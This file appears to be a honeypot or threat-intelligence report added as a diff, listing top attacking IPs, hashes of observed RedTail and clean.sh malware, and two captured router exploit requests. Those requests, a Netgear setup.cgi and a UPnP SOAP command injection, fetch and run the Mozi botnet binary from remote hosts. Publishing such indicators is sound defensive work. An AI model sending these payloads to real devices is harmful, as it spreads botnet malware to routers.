@@ -1,0 +1,52 @@
+Top 5 IPs for 02-08-2024 :
+
+160.22.173.233
+160.22.175.129
+8.213.22.203
+218.158.124.28
+54.219.179.80
+
+Malware Observed:
+
+File name: clean.sh
+d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e
+https://www.virustotal.com/gui/file/d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e
+
+
+File name: redtail.arm7
+28dc11bfe01f303a15c73150a9a7cdfda39828722c8ecb698147f78c500140a6
+https://www.virustotal.com/gui/file/28dc11bfe01f303a15c73150a9a7cdfda39828722c8ecb698147f78c500140a6
+
+
+File name: redtail.arm8
+66354c8878ca935f0fc6e3623e190e8a400318ded4c8d3d7baa85873059bc179
+https://www.virustotal.com/gui/file/66354c8878ca935f0fc6e3623e190e8a400318ded4c8d3d7baa85873059bc179
+
+
+File name: redtail.i686
+929efd52db47fe4723fb8532104b612f82414bc2c48639cfbf1dac69378f76fd
+https://www.virustotal.com/gui/file/929efd52db47fe4723fb8532104b612f82414bc2c48639cfbf1dac69378f76fd
+
+
+File name: redtail.x86_64
+17229e1940e272030b079915600ea9fd944b8250680d89e1ee1eca42bbe3772f
+https://www.virustotal.com/gui/file/17229e1940e272030b079915600ea9fd944b8250680d89e1ee1eca42bbe3772f
+
+
+Commands/exploits observed:
+
+GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0
+
+
+
+
+POST /soap.cgi?service=WANIPConn1 HTTP/1.1
+Host: <Host IP>
+Content-Length: 630
+Accept-Encoding: gzip, deflate
+SOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping
+Accept: */*
+User-Agent: Hello, World
+Connection: keep-alive
+
+<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><m:AddPortMapping xmlns:m="urn:schemas-upnp-org:service:WANIPConnection:1"><NewPortMappingDescription><NewPortMappingDescription><NewLeaseDuration></NewLeaseDuration><NewInternalClient>`cd /tmp;rm -rf *;wget http://115.214.231.33:55321/Mozi.m;/tmp/Mozi.m dlink`</NewInternalClient><NewEnabled>1</NewEnabled><NewExternalPort>634</NewExternalPort><NewRemoteHost></NewRemoteHost><NewProtocol>TCP</NewProtocol><NewInternalPort>45</NewInternalPort></m:AddPortMapping><SOAPENV:Body><SOAPENV:envelope>
